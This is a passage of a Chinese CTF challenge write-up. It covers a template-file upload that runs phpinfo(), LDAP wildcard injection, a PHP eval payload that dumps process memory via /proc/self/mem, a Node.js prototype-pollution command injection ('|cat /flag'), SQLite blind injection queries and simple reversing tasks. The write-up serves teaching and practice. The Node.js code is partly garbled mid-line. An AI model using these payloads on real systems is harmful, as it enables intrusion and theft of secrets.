可通过覆盖模板文件.tpl 控制模板内容
    POST /? HTTP/1.1
    Host: 
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=---------------------------43155698238817916993932117986
    Content-Length: 365
    Origin: http://
    DNT: 1
    Connection: close
    Referer: http://
    Upgrade-Insecure-Requests: 1
    Pragma: no-cache
    Cache-Control: no-cache
    -----------------------------43155698238817916993932117986
    Content-Disposition: form-data; name="file"; filename="header.tpl"
    Content-Type: application/octet-stream
    {phpinfo()}
    -----------------------------43155698238817916993932117986
    Content-Disposition: form-data; name="path"
    templates/
    -----------------------------43155698238817916993932117986--
再次访问首页 之前修改的模板被渲染 执行phpinfo函数 拿到环境变量中的flag
### 11 Easyinject
本题考察的是Ldap注入  
难度:简单  
首先通过页面注释账号登陆 发现提示 flag是在目录里面的某一个用户的邮箱属性  
通过关键词“目录“ “属性”可判断出题目使用了ldap 或在fuzz时页面报错也可以判断出使用了ldap  
这时可以使用通配符*猜测邮箱
    L*
    Ld*
    Lda*
这里注意有重叠的字符串需要额外做处理  
Ps 在读提交上来的wp时发现很多同学都是先跑出用户在跑邮箱 并且猜测出了原过滤器还构造了复杂的playload. 其实可以直接跑邮箱地址不用构造用户查询.
原本设计的是跑出ldap密码的题目. 比赛前觉得难度可能有点高不适合新生. 在收集的wp中居然有大佬跑出了原先设计的ldap密码. dltql
### 12 Hideandseek
难度:难  
题目提示1： 要怎样才能读到内存里面的flag呢?  
题目提示2： linuxの奇妙文件系统
本题需要完成读取php进程内存操作  
分析代码: 读取flag文件赋给$flag局部变量,目标是读取这个$flag变量的内容  
但是走到test函数时不能读到其他函数的局部变量  
只能通过读取内存获得flag.  
这时可利用linux虚拟文件系统的特性读取内存  
读取 /proc/self/maps 获取 进程自身内存布局  
使用获取到的布局信息读取自身内存  
/proc/self/mem (需要给出正确的偏移量才能成功读取)
    ?eval=$maps = file_get_contents('/proc/self/maps');$handle=fopen('/proc/self/mem','r');$r=explode(PHP_EOL,$maps);var_dump(explode('-',$r[7])[0]);fseek($handle,hexdec(explode('-',$r[7])[0]));echo fread($handle,10000000);
在dump出的内存寻找flag{字符串 即可获得flag
### 13 dirtyrce
难度:难
    var express = require('express');
    var nodeCmd = require('node-cmd');
    var bodyParser = require('body-parser');
    const app = express();
    var router = express.Router();
    const port = 80;
    app.use(bodyParser.urlencoded({
        extended: true
    })).use(bodyParser.json());
    function isValidIP(ip) {
        var reg = /^(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$/;
        return reg.test(ip);
    }
    app.post("/ping",
    function(req, res, next) {
        b = req.body.cmd;
        if (req.body.ping === undefined) {
            res.send('invalid parm');
            return;
        }
        ping = req.body.ping
        if (ping.time !== undefined) {
            time = Number(ping.time);
            if (time > 10 || time ping testIp:Times: ');
    });
    app.listen(port);
/ping 路由内有命令执行操作 但是ip经过严格的正则校验 无法绕过,time也有强制类型转换.  
只能想办法绕过这个校验.  
通读代码发现当输入参数数量为1且参数为time时不会校验flag内容.  
在后续还会使用三元运算符判断ip是否为空.  
构造原型污染 污染ping数组的原型 即可完成以上条件 达到命令执行的效果.
    ping[__proto__][ip]=|cat /flag&ping[time]=10
### 14 wschat
一个 nodejs+sqllite写的轻量聊天室  
难度:?  
本题考察特殊sql注入点的利用  
现在使用ws协议的网站越来越多 (出题时我就想到了为什么不出一道题目来学学ws注入)  
题目也使用了protobuf这是一种像json的结构化数据,在现在的httprpc中也非常常见.  
该题前后端交互使用了socket.io，通信使用protobuf做结构化数据.  
前端代码做了轻度混淆,并且具有反调试功能.  
阅读前端代码发现,用户输入存在正则校验.  
开始解题  
去除反调试和正则校验(修改js)  
手动测试发现注入点  
登陆处存在注入  
猜测语句为select xx from xx where xx='username'  
注册一个账号adad 使用布尔注入  
sqlite的布尔盲注方法
    判断表数量
    adad' and (select count(*) from sqlite_master where type='table')=5  -- 
    表名
    and substr((select name from sqlite_master where type='table' limit 0,1),1,1)='T'
    列名
    and substr((SELECT sql FROM sqlite_master where name='user_table'),33,1)='I'
    记录
    and substr((SELECT f16g FROM f16g_1s_1n_th1s_table),1,1)='f'
本题有两种解题方法  
第一种方法  
编写js脚本在浏览器运行 进行注入.  
第二种方法非常复杂 脱离浏览器编写脚本直接与ws后端通信.  
可惜在比赛结束前没有队伍解出这道题.但是在结束后or4nge团队提交了这道题目的wp 且使用了第二种方法.完美地完成了该题.
大家有兴趣可以看看or4nge战队大佬的[题解](user_cancel)  
（）
# RE
### 15 signin
直接查看字符串表即可获得flag
### 16 happyCTF
这道题是用c++写的，其实代码核心很简单就只是单字节异或，所以把密文当成明文输入就能得到flag,只是验证的过程稍微麻烦，是一个递归验证的算法，不过没什么用换成strcmp效果是一样的，只是起到一个迷惑的作用，原始代码很简单，但是开启代码优化以后再用ida反编译看起来就很乱了，这也是起到迷惑作用。加密的核心部分是用lambda匿名函数实现的起到一个加密代码隐藏的作用，防止这个最简单的加密被直接找到，所以下一次试试把密文当成flag输入，说不定有惊喜